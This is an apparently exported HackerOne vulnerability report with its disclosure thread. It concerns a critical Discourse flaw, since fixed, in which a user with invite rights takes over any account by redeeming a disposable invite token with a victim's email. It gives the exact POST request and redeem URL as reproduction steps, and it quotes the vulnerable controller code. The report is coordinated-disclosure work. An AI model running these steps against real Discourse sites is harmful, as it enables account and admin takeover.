{"id":242765,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDI3NjU=","url":"https://hackerone.com/reports/242765","title":"Any user with invite capabilities can take-over any account on Discourse","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2017-06-23T21:39:36.043Z","submitted_at":"2017-06-23T21:39:36.043Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mishre","url":"/mishre","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":16893,"url":"https://hackerone.com/discourse","handle":"discourse","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Discourse","twitter_handle":"discourse","website":"https://discourse.org","about":"Discourse is JavaScript (ember.js) and Ruby on Rails based 100% open source discussion software -- https://github.com/discourse/discourse"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-11-06T06:35:52.922Z","bug_reporter_agreed_on_going_public_at":"2017-10-07T06:35:44.372Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Description\nUsers with a trust level of 2 and above on Discourse (being a member for 15 days,reading more than 100 posts and more - can be seen on: https://github.com/discourse/discourse/blob/b7386958edfb8215c99d90fde04521b3312d2ccd/config/site_settings.yml)  can invite new users to join discourse by sending an invite request. However, there exists an endpoint which uses the invite key without verifying the associated mail with the request and logs in a user to the victim's account if a valid invite key is provided.\n\n## Steps to reproduce\n1) Login with a user with trust level of 2 or above to discourse (tested on my local instal and against the code).\n2) Now find a valid CSRF-TOKEN by browsing the site and then send the following request:\n```\nPOST http://localhost:4000/invites/link HTTP/1.1\nHost: localhost:4000\nConnection: keep-alive\nContent-Length: 35\nOrigin: http://localhost:4000\nX-CSRF-Token: 8DkyJoFTPN4G4f3dBUWp2AsEtTg3mp7/pmoqQ9JLaZeCsKSX5DPce0O+57ni+Gc/O0cbU2rl7Y3Bdf9i2s+uZg==\nDiscourse-Visible: true\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nAccept: */*\nX-Requested-With: XMLHttpRequest\nReferer: http://localhost:4000/\nAccept-Encoding: gzip, deflate, sdch, br\nAccept-Language: he-IL,he;q=0.8,en-US;q=0.6,en;q=0.4,es;q=0.2\nCookie: {redacted}\n\nemail=testingmichaelreiz@gmail.coma\n```\nyou\"ll receive the following response:\n```\nHTTP/1.1 200 OK\nX-Frame-Options: SAMEORIGIN\nX-XSS-Protection: 1; mode=block\nX-Content-Type-Options: nosniff\nX-Discourse-Username: {some-user}\nX-Discourse-Route: invites/create_invite_link\nCache-Control: no-store, must-revalidate, private, max-age=0\nContent-Type: application/json; charset=utf-8\nSet-Cookie: _t=8f6f82a4709bad6dd66263a225f202c5; path=/; expires=Tue, 22 Aug 2017 21:14:37 -0000; HttpOnly; SameSite=Lax\nSet-Cookie: _forum_session=RUpSZFVQZmx2emVieVYwM0tscDBKV29jZ3FmU2xXSmIvTGlPTFpTVit0Z1lCU29wYmN6eDlkTDFnWXF1a1RUcVluNy9UYVhkd3hNK1h1OHZwNFBYL202WllEUkJzbWVRTytVR0VRenlxMUsrZUF6cktQSm1JU0g2Y3p1WVlNZ2dXSHNINlVDUzZzSFBQcXVVQXZDR1c5dFhkc1c0Tmk3bDRlK2ljRFRraTF6bmp2QzgxTlNnTXBhWnllVU1HelptLS16cUVkVmg5cC9JdC91RzhRenJqSGVnPT0%3D--c3b63a42a9a94781bc137c1030a71a1241c04a24; path=/; HttpOnly; SameSite=Lax\nSet-Cookie: __profilin=p%3Dt; path=/\nX-Request-Id: 4181e2be-5061-49dd-b3cc-1e033ece95bc\nX-Runtime: 1.912866\nX-MiniProfiler-Ids: [\"jfv6h7gfji19eekx7p57\",\"nsqp68md79y8tusrn8rn\",\"4s5fo1o25vp9l7954ybm\",\"blf2ua82vyc0n9683jwb\",\"fe5d5qfugyl5u0hjp7ez\",\"3s7hzl7imehtnono8p18\",\"dmmjnggyftilvg882j9q\",\"bwvs5enxy6pqockcxael\",\"tfu1fnjp7hi5e0nxhqwf\"]\nContent-Length: 64\n\n\"http://localhost:3000/invites/{some-token}\"\n```\nNow copy the token for a use in the later steps - don't click the link.\n3) Now open a new incognito tab and launch the following url:\n```\nhttp://localhost:4000/invites/redeem/{token-from-step3}?email=victimemail@gmail.com\n```\nYou should now be logged in to the victim's account.\n\n## Resolution\nYou should probably bind the invite token to a specific email in the InvitesController class. Also, the InvitesController seems to log in any user which launches a disposable invite link to the account with the email provided along the request as can be seen in the invites controller class:\n```\n    invite = Invite.find_by(invite_key: params[:token])\n\n    if invite.present?\n      user = Invite.redeem_from_token(params[:token], params[:email], params[:username], params[:name], params[:topic].to_i)\n      if user.present?\n        log_on_user(user)\n```\n\n## Impact\nAny user with invitation capabilities can therefore login as an admin account in case he knows either his username or his email.","bounty_amount":"1024.0","formatted_bounty":"$1,024","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-11-06T06:35:44.416Z","allow_singular_disclosure_after":-124012358.34196085,"singular_disclosure_allowed":true,"vote_count":72,"voters":["jokebookservice1","jensec","sp1d3rs","streaak","hunter","bl4de","spam404","surfrdan","yumi","003random","and 62 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1778165,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for reporting @mishre, I confirmed this vulnerability and I'm escalating this to the Discourse team. Cheers!","automated_response":false,"created_at":"2017-06-24T01:59:45.515Z","updated_at":"2017-06-24T01:59:45.515Z","actor":{"username":"asuka","cleared":false,"url":"/asuka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/111/923/28e02b13f94679bbda8c7d3b7390776d8977f1b6_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1786652,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey, \nWas this triaged? Seems like a pretty serious issue. ","automated_response":false,"created_at":"2017-06-28T05:06:04.316Z","updated_at":"2017-06-28T05:06:04.316Z","actor":{"username":"mishre","cleared":false,"url":"/mishre","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1786857,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @mishre,\n\nWe're still looking into this and we'll get back to you as soon as we have an update.\n\nCheers","automated_response":false,"created_at":"2017-06-28T08:26:16.640Z","updated_at":"2017-06-28T08:26:16.640Z","actor":{"username":"asuka","cleared":false,"url":"/asuka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/111/923/28e02b13f94679bbda8c7d3b7390776d8977f1b6_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1812110,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey, still no updates regarding this? ","automated_response":false,"created_at":"2017-07-06T18:22:47.797Z","updated_at":"2017-07-06T18:22:47.797Z","actor":{"username":"mishre","cleared":false,"url":"/mishre","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1815902,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"sorry, we are going to look at this asap ","automated_response":false,"created_at":"2017-07-07T22:54:38.478Z","updated_at":"2017-07-07T22:54:38.478Z","actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1816056,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We have confirmed and fixed the issue. The disposable invite feature (meant to only be available via API) was insecure and so we have removed it.\n\nhttps://github.com/discourse/discourse/commit/f1a6449e4be0efe4a11fba75729d9499924b5602\n","automated_response":false,"created_at":"2017-07-08T00:55:17.482Z","updated_at":"2017-07-08T00:55:17.482Z","actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1816165,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey,\nSeems fixed now. Great job! ","automated_response":false,"created_at":"2017-07-08T03:30:34.136Z","updated_at":"2017-07-08T03:30:34.136Z","actor":{"username":"mishre","cleared":false,"url":"/mishre","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1817442,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Sorry, I was on vacation this week, and I check this about every other week or so. Great find and very deserving of maximum award, particularly since nobody noticed this since 2014! Thank you!","automated_response":false,"created_at":"2017-07-09T01:16:21.264Z","updated_at":"2017-07-09T01:16:21.264Z","actor":{"url":"/discourse","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Discourse"}},"bounty_amount":"1024.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"discourse","collaborator":{"username":"mishre","url":"/mishre"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1817443,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2017-07-09T01:16:36.196Z","updated_at":"2017-07-09T01:16:36.196Z","actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"mishre","url":"/mishre"},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1817482,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Sure, no problem! \nMind disclosing? ","automated_response":false,"created_at":"2017-07-09T03:17:34.998Z","updated_at":"2017-07-09T03:17:34.998Z","first_to_agree":true,"actor":{"username":"mishre","cleared":false,"url":"/mishre","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1818408,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It will need to wait 90 days due to the severity of the report. @asuka can you set that date via a scheduler?","automated_response":false,"created_at":"2017-07-09T21:29:39.609Z","updated_at":"2017-07-09T21:29:39.609Z","actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1883428,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"reopening this to prevent early disclosure, will perhaps lock as well... not really sure how to do this, the UI is quite unclear.","automated_response":false,"created_at":"2017-08-01T19:25:13.876Z","updated_at":"2017-08-01T19:25:13.876Z","actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1883430,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"","automated_response":false,"created_at":"2017-08-01T19:25:25.123Z","updated_at":"2017-08-01T19:25:25.123Z","actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1883432,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hey,\nActually the fix is visible through Github anyway(Marked as a security one). So can't really see any point to not disclosing it.","automated_response":false,"created_at":"2017-08-01T19:27:14.800Z","updated_at":"2017-08-01T19:27:14.800Z","actor":{"username":"mishre","cleared":false,"url":"/mishre","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1883447,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"not quite, this has step by step repro. So I need to block disclosure for 90 days as previously requested. If opening and asking for more info is the only way I can figure out to do it, then that's how it has to be done..","automated_response":false,"created_at":"2017-08-01T19:34:25.157Z","updated_at":"2017-08-01T19:34:25.157Z","actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1883449,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"","automated_response":false,"created_at":"2017-08-01T19:35:07.660Z","updated_at":"2017-08-01T19:35:07.660Z","actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1941992,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hey,\nMind closing this one as resolved and I'll ask for public disclosure when the time comes?","automated_response":false,"created_at":"2017-08-20T18:35:14.362Z","updated_at":"2017-08-20T18:35:14.362Z","actor":{"username":"mishre","cleared":false,"url":"/mishre","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2050794,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2017-10-07T06:32:21.871Z","updated_at":"2017-10-07T06:32:21.871Z","actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"mishre","url":"/mishre"},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2050801,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-10-07T06:35:44.387Z","updated_at":"2017-10-07T06:35:44.387Z","first_to_agree":true,"actor":{"username":"mishre","cleared":false,"url":"/mishre","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2136261,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-11-06T06:35:52.946Z","updated_at":"2017-11-06T06:35:52.946Z","actor":{"url":"/discourse","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Discourse"}},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}